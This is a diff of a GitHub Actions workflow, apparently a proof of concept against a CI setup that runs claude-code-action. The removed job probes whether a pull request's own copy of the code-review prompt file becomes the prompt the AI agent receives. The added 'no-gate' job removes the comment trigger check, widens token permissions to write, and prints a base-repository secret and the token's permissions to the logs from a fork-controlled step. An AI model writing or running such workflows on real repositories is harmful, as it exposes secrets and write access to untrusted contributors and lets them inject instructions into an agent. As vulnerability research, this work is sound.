@@ -3,47 +3,21 @@ on:
   pull_request_review_comment:
     types: [created]
 permissions:
-  contents: read
+  contents: write
   pull-requests: write
+  issues: write
 jobs:
-  probe:
-    if: contains(github.event.comment.body, '@claude')
+  no-gate:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v6
-      - name: Checkout identity (which ref did default checkout use?)
-        run: |
-          echo "GITHUB_REF=$GITHUB_REF"
-          echo "GITHUB_SHA=$GITHUB_SHA"
-          echo "HEAD=$(git rev-parse HEAD)"
-          echo "parents=$(git log -1 --pretty=%P)"
-          echo "default branch has the file? $(git cat-file -e origin/main:.github/prompts/code-review.md 2>/dev/null && echo yes || echo no)"
-          echo "--- PR-head .github/prompts/code-review.md in workspace ---"
-          cat .github/prompts/code-review.md
-      - name: Determine prompt to use
-        id: determine-prompt
+      - name: fork-controlled workflow step
         env:
-          COMMENT_BODY: ${{ github.event.comment.body }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          TRIMMED_COMMENT=$(echo "$COMMENT_BODY" | xargs)
-          if [ "$TRIMMED_COMMENT" = "@claude" ]; then
-            echo "use-code-review-prompt=true" >> "$GITHUB_OUTPUT"
-          else
-            echo "use-code-review-prompt=false" >> "$GITHUB_OUTPUT"
-          fi
-      - name: Read code review prompt
-        id: read-prompt
-        if: steps.determine-prompt.outputs.use-code-review-prompt == 'true'
-        run: |
-          PROMPT_CONTENT=$(cat .github/prompts/code-review.md)
-          {
-            echo "prompt-content<<EOF"
-            echo "$PROMPT_CONTENT"
-            echo "EOF"
-          } >> "$GITHUB_OUTPUT"
-      - name: Value the workflow passes to claude-code-action prompt input
-        env:
-          INJECTED_PROMPT: ${{ steps.read-prompt.outputs.prompt-content }}
-        run: |
-          echo "=== prompt: input value (what reaches the agent) ==="
-          printf '%s\n' "$INJECTED_PROMPT"
+          echo "SECRET_FROM_BASE_REPO=[${{ secrets.POC_MARKER_SECRET }}]"
+          echo "actor=${{ github.actor }} association=${{ github.event.comment.author_association }}"
+          echo "ref=$GITHUB_REF"
+          echo "head repo is fork: ${{ github.event.pull_request.head.repo.fork }}"
+          echo "base repo: ${{ github.repository }}"
+          echo "--- token perms ---"
+          gh api repos/${{ github.repository }} --jq '.permissions' || true
